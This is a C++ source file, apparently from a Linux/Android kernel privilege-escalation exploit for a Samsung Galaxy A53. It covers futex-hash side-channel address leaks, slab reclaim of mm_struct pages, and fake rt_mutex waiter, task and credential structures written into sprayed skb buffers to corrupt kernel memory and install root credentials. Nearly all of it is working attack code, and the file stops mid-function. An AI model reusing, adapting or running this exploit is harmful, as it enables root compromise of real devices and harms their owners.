#include "common.h"
#include "kernel/runtime_struct_offsets.h"

#include <algorithm>
#include <array>
#include <cstdint>
#include <cstdio>
#include <memory>
#include <string_view>
#include <vector>
#include "route/route_policy.hpp"
#include "session/exploit_session.hpp"
#include "support/native_resource.hpp"
#if defined(GHOSTLOCK_TARGET_A53_5_10)
#include "support/a53_reclaim.hpp"
#endif
#include "kernel/target.h"
#include "kernelsnitch/kernelsnitch.h"

/* Session aliases kept from the preprocessor era: the attack statements were
 * written with these short names, and references preserve every call site
 * without the macro. */
namespace {
    auto &ks = ghostlock::session::g_exploit_session.heap.snitch;
    auto &mm_objs_per_slab = ghostlock::session::g_exploit_session.heap.mm_objs_per_slab;
    auto &reclaim_sv = ghostlock::session::g_exploit_session.heap.current.reclaim.fd;
    auto &prepare_ctx = ghostlock::session::g_exploit_session.heap.prepare;
    auto &spray_ctx = ghostlock::session::g_exploit_session.heap.spray;
    auto &pre_ctx = ghostlock::session::g_exploit_session.heap.pre;
    auto &post_ctx = ghostlock::session::g_exploit_session.heap.post;
    auto &child_leak = ghostlock::session::g_exploit_session.heap.leak_child;

    /* The skb buffer is reallocated on every prepare pass, so the pointer is
     * read at each use instead of being bound once. */
    unsigned char *skb_buf() {
        return ghostlock::session::g_exploit_session.heap.skb_buffer.get();
    }
} // namespace

namespace ghostlock::support {
    static const profile::kernel_offsets *profile_values(void) {
        return session::g_exploit_session.profile.values();
    }

    static long long ms_since(const struct timespec *t0) {
        return static_cast<long long>(runtime_time::runtime_elapsed_ms(t0));
    }

    /* Persist stage-boundary diagnostics before a kernel panic or filesystem
     * rollback can discard buffered lines. Unsupported fsync targets are ignored. */
    void log_sync(void) {
        fflush(stdout);
        (void) fsync(STDOUT_FILENO);
    }

    [[noreturn]] void fail_stop_dirty_race(const char *reason,
                                           int32_t error_number) noexcept {
        pr_error("terminal dirty race: %s errno=%d; stopping native process\n",
                 reason ? reason : "unknown", error_number);
        log_sync();
        syscall(SYS_exit_group, 70);
        __builtin_unreachable();
    }

    void read_first_line(const char *path, char *buf, size_t len) {
        if (!len) {
            return;
        }
        snprintf(buf, len, "unreadable");
        support::UniqueFd fd(open(path, O_RDONLY | O_CLOEXEC));
        if (!fd.valid()) {
            return;
        }
        const ssize_t n = read(fd.get(), buf, len - 1);
        const int32_t saved_errno = errno;
        fd.reset();
        if (n <= 0) {
            errno = saved_errno;
            snprintf(buf, len, "unreadable");
            return;
        }
        buf[n] = 0;
        buf[strcspn(buf, "\r\n")] = 0;
    }

    void log_startup_context(void) {
        std::array < char, 256 > attr{};
        std::array < char, 32 > enforce{};
        std::array < char, 4096 > status{};
        std::array < char, 160 > limits{};
        snprintf(limits.data(), limits.size(),
                 "NoNewPrivs=? Seccomp=? Seccomp_filters=?");
        read_first_line("/proc/self/attr/current", attr.data(), attr.size());
        read_first_line("/sys/fs/selinux/enforce", enforce.data(), enforce.size());
        support::UniqueFd fd(open("/proc/self/status", O_RDONLY | O_CLOEXEC));
        if (fd.valid()) {
            const ssize_t n = read(fd.get(), status.data(), status.size() - 1);
            if (n > 0) {
                status[static_cast<size_t>(n)] = 0;
                const std::array<const char *, 3> names = {
                    "NoNewPrivs:", "Seccomp:", "Seccomp_filters:"
                };
                std::array < std::array < char, 32 >, 3 > values = {
                    {
                        std::array < char, 32 >{"?"},
                        std::array < char, 32 >{"?"},
                        std::array < char, 32 >{"?"},
                    }
                };
                const std::string_view status_view(status.data(), static_cast<size_t>(n));
                for (size_t i = 0; i < names.size(); i++) {
                    const size_t at = status_view.find(names[i]);
                    if (at == std::string_view::npos) continue;
                    std::string_view rest =
                            status_view.substr(at + strlen(names[i]));
                    const size_t first = rest.find_first_not_of("\t ");
                    if (first == std::string_view::npos) {
                        values[i][0] = 0;
                        continue;
                    }
                    rest.remove_prefix(first);
                    size_t len = rest.find_first_of("\r\n");
                    if (len == std::string_view::npos) len = rest.size();
                    if (len >= values[i].size()) {
                        len = values[i].size() - 1;
                    }
                    memcpy(values[i].data(), rest.data(), len);
                    values[i][len] = 0;
                }
                snprintf(limits.data(), limits.size(), "NoNewPrivs=%s Seccomp=%s "
                         "Seccomp_filters=%s", values[0].data(), values[1].data(),
                         values[2].data());
            }
        }
        struct timespec boot;
        SYSCHK(clock_gettime(CLOCK_BOOTTIME, &boot));
        double boot_ms =
                static_cast<double>(boot.tv_sec) * 1000.0 + static_cast<double>(boot.tv_nsec) / 1e6;
        pr_success("startup context pid=%d uid=%u euid=%u gid=%u egid=%u "
                   "boot_ms=%.0f attr=%s enforce=%s\n",
                   getpid(), getuid(), geteuid(), getgid(), getegid(), boot_ms,
                   attr.data(), enforce.data());
        pr_success("startup limits pid=%d %s\n", getpid(), limits.data());
        pr_success("build config pid=%d label=%s slide=pselect main=pselect\n",
                   getpid(), kernel::BUILD_VARIANT_LABEL);
        pr_success("p0 profile pid=%d phys_offset=%016llx kernel_phys_load=%016llx "
                   "delta=%016llx slide_logger=%016llx bootid_data=%016llx "
                   "init_task=%016llx root_tg=%016llx sysctl_bootid=%016llx\n",
                   getpid(), (unsigned long long) session::g_exploit_session.addresses.phys_offset,
                   (unsigned long long) session::g_exploit_session.addresses.phys_load(),
                   (unsigned long long) (session::g_exploit_session.addresses.phys_load() -
                                         session::g_exploit_session.addresses.phys_offset),
                   (unsigned long long) ghostlock::profile::slide_nfulnl_logger(),
                   (unsigned long long) ghostlock::profile::slide_random_boot_id_data(),
                   (unsigned long long) ghostlock::profile::slide_init_task(),
                   (unsigned long long) ghostlock::profile::slide_root_task_group(),
                   (unsigned long long) ghostlock::profile::slide_sysctl_bootid());
    }

    void disable_rseq_for_thread(void) {
        return;
    }

    long futex_op(uint32_t *uaddr, int32_t op, uint32_t val,
                  const void *timeout_or_value, uint32_t *uaddr2,
                  uint32_t val3) {
        return syscall(SYS_futex, uaddr, op, val, timeout_or_value, uaddr2, val3);
    }

    long sched_setattr_tid(int32_t tid, int32_t nice_value) {
        kernel::local_sched_attr attr;
        memset(&attr, 0, sizeof(attr));
        attr.size = sizeof(attr);
        attr.sched_policy = 3; /* SCHED_BATCH — nice change triggers PI walk (pi=true) */
        attr.sched_nice = nice_value;
        errno = 0;
        long ret = syscall(274, tid, &attr, 0);
        if (ret != 0) {
            pr_error("sched_setattr(%d,BATCH,nice=%d) ret=%ld errno=%d\n", tid, nice_value, ret, errno);
        }
        return ret;
    }

    void init_p0_profile(void) {
        pr_info("p0 kernel_phys_load=%016llx delta=%016llx\n",
                (unsigned long long) session::g_exploit_session.addresses.phys_load(),
                (unsigned long long) (session::g_exploit_session.addresses.phys_load() -
                                      session::g_exploit_session.addresses.phys_offset));
    }

    void put64(unsigned char *p, size_t off, uint64_t value) {
        memcpy(p + off, &value, sizeof(value));
    }

    void put32(unsigned char *p, size_t off, uint32_t value) {
        memcpy(p + off, &value, sizeof(value));
    }

    static int32_t fill_profile_cred_copy(unsigned char *p, size_t off) {
        const profile::kernel_offsets *v = profile_values();
        if (!v || !v->credential.copy_size || v->credential.copy_size > kernel::ORDER3_SIZE ||
            v->credential.usage_offset + sizeof(uint32_t) > v->credential.copy_size ||
            v->credential.caps_offset + v->credential.caps_count * sizeof(uint64_t) >
            v->credential.copy_size) {
            pr_error("credential copy profile is incomplete\n");
            return 0;
        }
        unsigned char *c = p + off;
        memset(c, 0, v->credential.copy_size);
        put32(c, v->credential.usage_offset, v->credential.usage_value);
        for (uint32_t i = 0; i < v->credential.caps_count; i++) {
            put64(c, v->credential.caps_offset + i * sizeof(uint64_t), v->credential.caps_value);
        }

        const std::array<uint32_t, 4> ref_offsets = {
            v->credential.ref0_offset, v->credential.ref1_offset,
            v->credential.ref2_offset, v->credential.ref3_offset,
        };
        const std::array<uint64_t, 4> ref_images = {
            v->credential.ref0_image, v->credential.ref1_image,
            v->credential.ref2_image, v->credential.ref3_image,
        };
        if (v->credential.ref_count > ref_offsets.size()) {
            pr_error("credential reference count %u exceeds the %zu slots\n",
                     v->credential.ref_count, ref_offsets.size());
            return 0;
        }
        for (size_t i = 0; i < v->credential.ref_count; i++) {
            if (ref_offsets[i] + sizeof(uint64_t) > v->credential.copy_size) {
                pr_error("credential reference %zu exceeds configured copy size\n", i);
                return 0;
            }
            put64(c, ref_offsets[i],
                  session::g_exploit_session.addresses.data_alias(ref_images[i]));
        }
        return 1;
    }

    pid_t clone_child(void) {
        pid_t child = static_cast<pid_t>(SYSCHK(syscall(SYS_clone, SIGCHLD, nullptr, nullptr, nullptr, 0)));
        if (child == 0) {
            SYSCHK(prctl(PR_SET_PDEATHSIG, SIGKILL));
            if (getppid() == 1) {
                _exit(0);
            }
            kernel::pin_to_core(static_cast<size_t>(config::runtime_config_snapshot().main_cpu));
            for (;;) {
                pause();
            }
        }
        return child;
    }

    pid_t clone_leak_child(void) {
        pid_t child = static_cast<pid_t>(SYSCHK(syscall(SYS_clone, SIGCHLD, nullptr, nullptr, nullptr, 0)));
        if (child == 0) {
            ghostlock::kernelsnitch::context_find_collisions(ks);
            exit(0);
        }
        return child;
    }

    int32_t open_memfd(pid_t child) {
        std::array < char, 64 > path{};
        snprintf(path.data(), path.size(), "/proc/%d/mem", child);
        return SYSCHK(open(path.data(), O_RDONLY));
    }

    void kill_child(pid_t child) {
        if (child <= 0) {
            return;
        }
        SYSCHK(kill(child, SIGKILL));
        SYSCHK(waitpid(child, nullptr, 0));
    }

    void close_reclaim_sockets(void) {
        session::g_exploit_session.heap.current.destroy();
    }

    int32_t quarantine_reclaim_sockets(void) {
        return session::g_exploit_session.heap.current.move_to(session::g_exploit_session.heap.quarantine,
                                                               memory::PayloadPageState::Quarantined);
    }

    void release_quarantined_reclaim_sockets(void) {
        session::g_exploit_session.heap.quarantine.destroy();
    }

    Status stash_prebuilt_page(void) {
        return session::g_exploit_session.heap.current.move_to(session::g_exploit_session.heap.prebuilt,
                                                               memory::PayloadPageState::Prebuilt);
    }

    Status activate_prebuilt_page(void) {
        if (!session::g_exploit_session.heap.prebuilt.has_reclaim()) return false;
        close_reclaim_sockets();
        return session::g_exploit_session.heap.prebuilt.move_to(session::g_exploit_session.heap.current,
                                                                memory::PayloadPageState::Current);
    }

    void discard_prebuilt_page(void) {
        session::g_exploit_session.heap.prebuilt.destroy();
    }

    void cleanup_page_prepare_state(void) {
        memory::close_ctx_memfds(&prepare_ctx);
        memory::close_ctx_memfds(&spray_ctx);
        memory::close_ctx_memfds(&pre_ctx);
        memory::close_ctx_memfds(&post_ctx);
        if (session::g_exploit_session.heap.leak_memfd.get() > 0) {
            session::g_exploit_session.heap.leak_memfd.reset();
        }
        memory::free_ctx_storage(&prepare_ctx);
        memory::free_ctx_storage(&spray_ctx);
        memory::free_ctx_storage(&pre_ctx);
        memory::free_ctx_storage(&post_ctx);
        session::g_exploit_session.heap.skb_buffer.reset();
    }

    int32_t clone_memfd(void) {
        pid_t child = clone_child();
        int32_t fd = open_memfd(child);
        kill_child(child);
        return fd;
    }

    void prepare_ctxs(void) {
        prepare_ctx.childs.assign(8 * mm_objs_per_slab, 0);
        prepare_ctx.memfds.assign(8 * mm_objs_per_slab, 0);

        spray_ctx.childs.assign((1 + kernel::MM_PARTIALS) * mm_objs_per_slab, 0);
        spray_ctx.memfds.assign((1 + kernel::MM_PARTIALS) * mm_objs_per_slab, 0);

        pre_ctx.childs.assign(mm_objs_per_slab - 1, 0);
        pre_ctx.memfds.assign(mm_objs_per_slab - 1, 0);

        post_ctx.childs.assign(mm_objs_per_slab, 0);
        post_ctx.memfds.assign(mm_objs_per_slab, 0);
    }

    int32_t prepare_skb_payload(uintptr_t base, const memory::WriteRequest *request) {
        memset(skb_buf(), 0, kernel::SKB_SEND_SIZE);

        const bool tcp_layout = route::route_capability(
            session::g_exploit_session.profile,
            [](auto policy) { return std::decay_t<decltype(policy)>::tcp_payload_layout; });
        long long payload_delta = tcp_layout ? 0 : kernel::SKB_DATA_DELTA;
        size_t chunk_bias = tcp_layout ? 0xe80 : static_cast<size_t>(kernel::SKB_FRAG_BIAS);
        size_t fake_task_off = tcp_layout ? kernel::TCP_FAKE_TASK_OFF : static_cast<size_t>(kernel::FAKE_TASK_OFF);

        uintptr_t payload_base = base + static_cast<uintptr_t>(payload_delta);

        (session::g_exploit_session.heap.current.fake_lock) = payload_base + kernel::LOCK_OFF;
        (session::g_exploit_session.heap.current.fake_w0) = payload_base + kernel::W0_OFF;
        (session::g_exploit_session.heap.current.fake_task) = payload_base + fake_task_off;
        uintptr_t default_fops = payload_base + kernel::FOPS_TABLE_OFF;
        uintptr_t credential_fops =
                payload_base + (tcp_layout ? kernel::TCP_CRED_COPY_OFF : kernel::CRED_COPY_OFF);
        memory::PayloadWriteLayout write_layout = payload_write_layout(
            request, base, default_fops, credential_fops,
            session::g_exploit_session.addresses.
            data_alias(session::g_exploit_session.addresses.init_cred_image_addr()));
        (session::g_exploit_session.heap.current.fake_parent) = write_layout.parent;
        (session::g_exploit_session.heap.current.fake_right) = write_layout.right;
        (session::g_exploit_session.heap.current.fake_left) = write_layout.left;
        (session::g_exploit_session.heap.current.fake_fops) = write_layout.fops;

        uintptr_t write_pc = (session::g_exploit_session.heap.current.fake_parent);
        uintptr_t write_right = (session::g_exploit_session.heap.current.fake_right);
        uintptr_t write_left = (session::g_exploit_session.heap.current.fake_left);
        /* Direct-map aliases (data_addr) resolve to the same physical pages and are
         * dereferenceable on every SoC — the tcp route already uses ghostlock::profile::slide_init_task()
         * the same way for the on-stack waiter (upstream U01-D). */
        uint64_t waiter_task = ghostlock::profile::slide_init_task();
        uint64_t task_group = ghostlock::profile::slide_root_task_group();
        uint64_t pi_top_task = ghostlock::profile::slide_init_task();

        const profile::kernel_offsets *v = profile_values();
        int32_t compact = session::g_exploit_session.profile.has_compact_waiter();

        for (size_t chunk = 0; chunk < kernel::SKB_SEND_SIZE; chunk += kernel::ORDER3_SIZE) {
            unsigned char *p = skb_buf() + chunk + chunk_bias;

            put32(p, kernel::LOCK_OFF + 0x00, 0);
            put64(p, kernel::LOCK_OFF + 0x08, (session::g_exploit_session.heap.current.fake_w0));
            put64(p, kernel::LOCK_OFF + 0x10, (session::g_exploit_session.heap.current.fake_w0));
            put64(p, kernel::LOCK_OFF + 0x18, (session::g_exploit_session.heap.current.fake_task) | 1);

            if (compact) {
                /* Words ride the erase relink: pc = value, rb_left = dest,
                 * rb_right = 0 or the one-child arm also clobbers *(value) with
                 * dest-8. Value 0 uses pc = dest-8 (stores 0 at *dest); pc = 0
                 * would leave the node parentless for enqueue_pi to trash
                 * fake_task. prio > 120 gates this erase. The relink's second
                 * write lands in *(value+8): cred image on W2, page rb_root at 0. */
                put64(p, kernel::W0_OFF + 0x00, 1); /* tree_entry.rb_parent_color */
                put64(p, kernel::W0_OFF + 0x08, 0); /* tree_entry.rb_right */
                put64(p, kernel::W0_OFF + 0x10, 0); /* tree_entry.rb_left */
                (void) encode_compact_waiter(
                    {
                        reinterpret_cast<std::byte *>(p + kernel::W0_OFF),
                        memory::kCompactWaiterBytes
                    },
                    *request, write_layout);
                put64(p, kernel::W0_OFF + 0x30, waiter_task); /* task */
                put64(p, kernel::W0_OFF + 0x38, (session::g_exploit_session.heap.current.fake_lock)); /* lock */
                put32(p, kernel::W0_OFF + 0x40, 0); /* wake_state */
                put32(p, kernel::W0_OFF + 0x44, kernel::FAKE_WAITER_PRIO); /* prio */
                put64(p, kernel::W0_OFF + 0x48, 0); /* deadline */
                put64(p, kernel::W0_OFF + 0x50, 0); /* ww_ctx */
            } else {
                /* 6.6 rt_mutex_waiter with rb_node tree/pi_tree */
                put64(p, kernel::W0_OFF + 0x00, 1);
                put64(p, kernel::W0_OFF + 0x08, 0);
                put64(p, kernel::W0_OFF + 0x10, 0);
                put32(p, kernel::W0_OFF + kernel::FAKE_WAITER_TREE_PRIO_OFF, kernel::FAKE_WAITER_PRIO);
                put64(p, kernel::W0_OFF + kernel::FAKE_WAITER_TREE_DEADLINE_OFF, 0);
                put64(p, kernel::W0_OFF + kernel::FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x00, write_pc);
                put64(p, kernel::W0_OFF + kernel::FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x08, write_right);
                put64(p, kernel::W0_OFF + kernel::FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x10, write_left);
                put32(p, kernel::W0_OFF + kernel::FAKE_WAITER_PI_TREE_PRIO_OFF, kernel::FAKE_WAITER_PRIO);
                put64(p, kernel::W0_OFF + kernel::FAKE_WAITER_PI_TREE_DEADLINE_OFF, 0);
                put64(p, kernel::W0_OFF + kernel::FAKE_WAITER_TASK_OFF, waiter_task);
                put64(p, kernel::W0_OFF + kernel::FAKE_WAITER_LOCK_OFF,
                      (session::g_exploit_session.heap.current.fake_lock));
                put32(p, kernel::W0_OFF + kernel::FAKE_WAITER_WAKE_STATE_OFF, 0);
                put64(p, kernel::W0_OFF + kernel::FAKE_WAITER_WW_CTX_OFF, 0);
            }

            /* Use runtime offsets for 6.1 compact; target.h constants for 6.6. */
            uint32_t ft_prio_off = compact
                                       ? v->task.prio
                                       : ghostlock::profile::fake_task_prio_off();
            uint32_t ft_nprio_off = compact
                                        ? v->task.normal_prio
                                        : ghostlock::profile::fake_task_normal_prio_off();
            uint32_t ft_tg_off = compact
                                     ? v->task.sched_task_group
                                     : ghostlock::profile::fake_task_task_group_off();
            uint32_t ft_pi_lock_off = compact
                                          ? v->task.pi_lock
                                          : ghostlock::profile::fake_task_pi_lock_off();
            uint32_t ft_pi_wait_off = compact
                                          ? v->task.pi_waiters
                                          : ghostlock::profile::fake_task_pi_waiters_off();
            uint32_t ft_pi_top_off = compact
                                         ? v->task.pi_top_task
                                         : ghostlock::profile::fake_task_pi_top_task_off();
            uint32_t ft_pi_blocked_off = compact
                                             ? v->task.pi_blocked_on
                                             : ghostlock::profile::fake_task_pi_blocked_on_off();

            put32(p, fake_task_off + kernel::FAKE_TASK_USAGE_OFF, 0x100);
            put32(p, fake_task_off + ft_prio_off, kernel::FAKE_TASK_PRIO);
            put32(p, fake_task_off + ft_nprio_off, kernel::FAKE_TASK_PRIO);
            put32(p, fake_task_off + ft_pi_lock_off, 0);
            /* Empty PI waiters avoid tree rebalancing during reinsertion. */
            put64(p, fake_task_off + ft_pi_wait_off, 0);
            put64(p, fake_task_off + ft_pi_wait_off + 0x08, 0);
            put64(p, fake_task_off + ft_tg_off, task_group);
            put64(p, fake_task_off + ft_pi_top_off, pi_top_task);
            put64(p, fake_task_off + ft_pi_blocked_off, 0);

            put64(p, kernel::RIGHT_OFF + 0x00, (session::g_exploit_session.heap.current.fake_parent));
            put64(p, kernel::RIGHT_OFF + 0x08, 0);
            put64(p, kernel::RIGHT_OFF + 0x10, 0);

            put64(p, kernel::LEFT_OFF + 0x00, (session::g_exploit_session.heap.current.fake_parent));
            put64(p, kernel::LEFT_OFF + 0x08, 0);
            put64(p, kernel::LEFT_OFF + 0x10, 0);

            if (write_layout.needs_credential_copy &&
                !fill_profile_cred_copy(p, tcp_layout ? kernel::TCP_CRED_COPY_OFF : kernel::CRED_COPY_OFF)) {
                return 0;
            }
        }
        return 1;
    }

    /* TODO(CPP07-OWNER): partial prepare failure injection still needs a
     * syscall-level fault-injection framework; the ownership refactor itself is
     * complete (CPP12h). Completion: add the framework, cover the early-exit
     * paths, then delete this comment and the residual row. */

#if defined(GHOSTLOCK_TARGET_A53_5_10)
/* --- A53 mm_struct reclaim ------------------------------------------------
 *
 * Ported from Root-My-Galaxy-Payloads
 * src/targets/a53x-A536EXXSNGZG3/page.c. Two behaviours there are what make
 * the leak reliable on this SoC, and neither exists in the generic path:
 *
 *  1. A single leaked mm_struct is not enough. The target has to be a whole
 *     order-3 slab, every object of which resolves under all collision futexes
 *     -- the group hunt keeps re-running until it holds ORDER3_SIZE /
 *     MM_STRUCT_SZ of them, grouped by slab base.
 *
 *  2. The slab only becomes reclaimable under drain pressure. Pin
 *     A53_TRIGGER_SLABS * batch extra references, release all but the last
 *     target reference, wait, and only then free the tail -- so the SLUB free
 *     actually lands where the later scan looks.
 *
 * DMA32 candidates are held and discarded rather than used: upstream documents
 * that they do not reclaim into the SKB allocation path on this device.
 *
 * src/core/kernelsnitch/ is untouched; everything here goes through the
 * public context_* API that page.c's staged C calls map onto. It lives in this
 * translation unit because kernelsnitch.h defines print_state/print_collisions
 * non-inline, so it cannot be included by a second TU.
 * See docs/development/a53-reclaim-port-plan.md.
 */

namespace a53_reclaim {

/* Upper bound on slab groups tracked while hunting, mirroring upstream's
 * max_groups. Well above the number observed in practice. */
constexpr size_t kMaxGroups = 64;

/* page.c's zone_of(): which physmap window a slab base falls in. Only the
 * normal window is usable on this device. */
enum class MmZone { Invalid, Dma32, Normal };

MmZone zone_of(uintptr_t mm) {
    const uintptr_t base = mm & ~(kernel::ORDER3_SIZE - 1);
    if (base >= kernel::A53_DMA32_ALIAS_START && base < kernel::A53_DMA32_ALIAS_END) {
        return MmZone::Dma32;
    }
    if (base >= kernel::A53_NORMAL_ALIAS_START && base < kernel::A53_NORMAL_ALIAS_END) {
        return MmZone::Normal;
    }
    return MmZone::Invalid;
}

bool valid_normal_mm(uintptr_t mm, size_t mm_struct_sz, size_t batch) {
    if (zone_of(mm) != MmZone::Normal) {
        return false;
    }
    const uintptr_t base = mm & ~(kernel::ORDER3_SIZE - 1);
    const uintptr_t offset = mm - base;
    return offset < kernel::ORDER3_SIZE && offset % mm_struct_sz == 0 && batch > 0 &&
           offset / mm_struct_sz < batch;
}

/* The canonical mm_struct of the slab at `base`, or -1.
 *
 * Equivalent to page.c's match_page(): a candidate counts only when its futex
 * bucket is identical under every collision address. Requiring exactly one
 * match across the slab keeps a partially-reclaimed slab from being accepted. */
uintptr_t match_page(kernelsnitch::KernelSnitchContext *ks, uintptr_t base, size_t mm_struct_sz,
                     size_t batch) {
    uintptr_t found = static_cast<uintptr_t>(-1);
    size_t count = 0;
    for (size_t slot = 0; slot < batch; slot++) {
        const uintptr_t candidate = base + slot * mm_struct_sz;
        const size_t bucket = kernelsnitch::futex_hash_context_bucket(
                &ks->futex_hash, ks->futex_addrs[0], candidate);
        bool all = true;
        for (size_t i = 1; i < ks->collisions; i++) {
            if (kernelsnitch::futex_hash_context_bucket(&ks->futex_hash, ks->futex_addrs[i], candidate) !=
                bucket) {
                all = false;
                break;
            }
        }
        if (all) {
            found = candidate;
            count++;
        }
    }
    /* The tag nibble replaces bits 56-59; restore the canonical VA. */
    return count == 1 ? (found | (static_cast<uintptr_t>(0xf) << 56)) : static_cast<uintptr_t>(-1);
}

/* One hunt: set up a context, find collisions in a child, then brute-force.
 *
 * With a confirmed slab base in hand the hint path runs, which needs only two
 * collisions and a match test instead of a full scan. A hint that stops
 * matching falls back to the general four-collision hunt next round.
 *
 * Returns the held memfd on success, -2 when no usable mm was found, and -3
 * when the hint went stale. */
/* Fork a child that finds collisions on THIS hunt's context, wait for it to
 * finish, then reap it.
 *
 * The module-level clone_leak_child() cannot be reused here: it drives the
 * outer scan context through its state machine, not the per-hunt one, which
 * both fails to populate this context and pushes the outer one into an
 * illegal transition. The child is always reaped -- leaking one per attempt
 * exhausts the process table and every later clone fails with EAGAIN. */
bool find_collisions_for(kernelsnitch::KernelSnitchContext *ctx) {
    pid_t child = 0;
    do {
        child = static_cast<pid_t>(syscall(SYS_clone, SIGCHLD, nullptr, nullptr, nullptr, 0));
    } while (child < 0 && errno == EINTR);
    if (child == 0) {
        kernelsnitch::context_find_collisions(ctx);
        _exit(kernelsnitch::context_has_collisions(ctx) ? 0 : 4);
    }
    /* Under process-table pressure clone fails with EAGAIN. SYSCHK is
     * log-and-continue, so the -1 has to be caught here: waitpid(-1, ...)
     * would reap an unrelated child and desynchronise the hunt. Resource
     * pressure must degrade the attempt, not corrupt the run. */
    if (child < 0) {
        return false;
    }
    int status = 0;
    const bool reaped = waitpid(child, &status, 0) == child;
    if (!reaped) {
        kill(child, SIGKILL);
        waitpid(child, nullptr, 0);
    }
    return reaped && WIFEXITED(status) && !WEXITSTATUS(status) && kernelsnitch::context_has_collisions(ctx);
}

int32_t leak_mm(size_t cpu_count, uintptr_t hint, size_t mm_struct_sz, size_t mm_slab_order,
                size_t batch, uintptr_t *mm_out) {
    const size_t collisions = hint ? 2 : 4;
    /* Each hunt spawns one thread per CPU and tears them all down again, so
     * pace the attempts: 256 back-to-back create/destroy rounds is enough to
     * hit the thread limit even with every child reaped. */
    const size_t threads = cpu_count < 4 ? cpu_count : 4;
    kernelsnitch::KernelSnitchOwner ks = kernelsnitch::KernelSnitchOwner::create(
            mm_struct_sz, mm_slab_order, threads, collisions, 0, 0);
    if (!ks.get()) {
        return -2;
    }
    if (!find_collisions_for(ks.get())) {
        return -2;
    }
    if (hint) {
        const uintptr_t hit = match_page(ks.get(), hint, mm_struct_sz, batch);
        if (hit == static_cast<uintptr_t>(-1)) {
            return -3;
        }
        *mm_out = hit;
    } else if (ks.scan() != 0) {
        return -2;
    } else {
        *mm_out = ks.result();
    }
    /* Take the reference only once the mm is known, so a failed hunt holds no
     * memfd. clone_memfd() kills and reaps its own child. */
    return clone_memfd();
}

} // namespace a53_reclaim

std::size_t a53_mm_objs_per_slab(std::size_t mm_struct_sz) noexcept {
    return mm_struct_sz ? kernel::ORDER3_SIZE / mm_struct_sz : 0;
}

bool a53_valid_normal_mm(std::uintptr_t mm, std::size_t mm_struct_sz, std::size_t batch) noexcept {
    return a53_reclaim::valid_normal_mm(mm, mm_struct_sz, batch);
}

bool a53_collect_full_group(std::size_t cpu_count, std::size_t mm_struct_sz, std::size_t mm_slab_order,
                            A53ReclaimGroup *group) noexcept {
    if (!group || !mm_struct_sz) {
        return false;
    }
    const size_t batch = a53_mm_objs_per_slab(mm_struct_sz);
    if (!batch) {
        return false;
    }
    /* References we pin and then discard rather than use. Holding a DMA32
     * candidate for a while keeps it from being freed and recycled underneath
     * the hunt while we look for a normal-zone slab instead. */
    const size_t dma32_refs = kernel::A53_DMA32_SKIP_SLABS * batch;
    /* Same capacity bound upstream uses. Without it a run that keeps landing on
     * DMA32 pins refs unboundedly -- 256 attempts x 272 refs is 70k processes,
     * which is enough to exhaust the process table and memory on its own. */
    const size_t opaque_capacity = kernel::A53_PAGE_SCAN_MAX * batch;
    std::vector<int32_t> opaque;
    std::vector<uintptr_t> bases;
    std::vector<size_t> counts;
    std::vector<int32_t> fds(a53_reclaim::kMaxGroups * batch, -1);
    std::vector<unsigned char> seen(a53_reclaim::kMaxGroups * batch, 0);
    size_t group_count = 0;
    size_t chosen = a53_reclaim::kMaxGroups;
    uintptr_t hint = 0;

    for (unsigned long attempt = 1; attempt <= kernel::A53_PAGE_SCAN_MAX; attempt++) {
        uintptr_t mm = 0;
        const int32_t fd = a53_reclaim::leak_mm(cpu_count, hint, mm_struct_sz, mm_slab_order, batch, &mm);
        if (fd == -3) {
            /* Hint went stale: fall back to the general hunt next round. */
            hint = 0;
            continue;
        }
        if (fd < 0) {
            continue;
        }
        if (!a53_valid_normal_mm(mm, mm_struct_sz, batch)) {
            /* DMA32, or a slot outside the slab: hold briefly, then drop. */
            if (opaque.size() + dma32_refs > opaque_capacity) {
                pr_warning("A53_DMA32_LIMIT attempt=%lu opaque=%zu cap=%zu\n",
                        static_cast<unsigned long>(attempt), opaque.size(), opaque_capacity);
                SYSCHK(close(fd));
                break;
            }
            SYSCHK(close(fd));
            for (size_t i = 1; i < dma32_refs; i++) {
                opaque.push_back(clone_memfd());
            }
            pr_info("A53_DMA32_SKIP attempt=%lu base=0x%016zx refs=%zu total=%zu\n",
                    static_cast<unsigned long>(attempt), mm & ~(kernel::ORDER3_SIZE - 1), dma32_refs,
                    opaque.size());
            hint = 0;
            continue;
        }
        const uintptr_t base = mm & ~(kernel::ORDER3_SIZE - 1);
        hint = base;
        usleep(20000);
        size_t slot_index = a53_reclaim::kMaxGroups;
        for (size_t i = 0; i < group_count; i++) {
            if (bases[i] == base) {
                slot_index = i;
                break;
            }
        }
        if (slot_index == a53_reclaim::kMaxGroups && group_count < a53_reclaim::kMaxGroups) {
            slot_index = group_count++;
            bases.push_back(base);
            counts.push_back(0);
        }
        if (slot_index == a53_reclaim::kMaxGroups) {
            SYSCHK(close(fd));
            hint = 0;
            continue;
        }
        const size_t slot = (mm - base) / mm_struct_sz;
        const size_t flat = slot_index * batch + slot;
        if (seen[flat]) {
            /* Same object twice: hold it so it is not recycled, keep hunting. */
            opaque.push_back(fd);
            hint = 0;
            continue;
        }
        seen[flat] = 1;
        fds[flat] = fd;
        counts[slot_index]++;
        if (counts[slot_index] == batch) {
            chosen = slot_index;
            break;
        }
    }

    /* Release everything that is not the chosen group. */
    for (size_t g = 0; g < group_count; g++) {
        for (size_t slot = 0; slot < batch; slot++) {
            const int32_t fd = fds[g * batch + slot];
            if (fd >= 0 && !(chosen != a53_reclaim::kMaxGroups && g == chosen)) {
                SYSCHK(close(fd));
                fds[g * batch + slot] = -1;
            }
        }
    }
    for (const int32_t fd : opaque) {
        SYSCHK(close(fd));
    }
    if (chosen == a53_reclaim::kMaxGroups) {
        pr_warning("A53_GROUP_NONE scan=%u groups=%zu opaque=%zu\n",
                static_cast<unsigned>(kernel::A53_PAGE_SCAN_MAX), group_count, opaque.size());
        return false;
    }

    auto held = std::make_unique<int32_t[]>(batch);
    for (size_t slot = 0; slot < batch; slot++) {
        held[slot] = fds[chosen * batch + slot];
    }
    pr_info("A53_GROUP_SELECTED base=0x%016zx zone=normal objects=%zu attempts=%lu\n",
            bases[chosen], batch, static_cast<unsigned long>(kernel::A53_PAGE_SCAN_MAX));
    group->base = bases[chosen];
    group->held = held.release();
    group->held_len = batch;
    group->batch = batch;
    group->complete = true;
    return true;
}

void a53_drain_group(A53ReclaimGroup *group) noexcept {
    if (!group || !group->held || !group->batch) {
        return;
    }
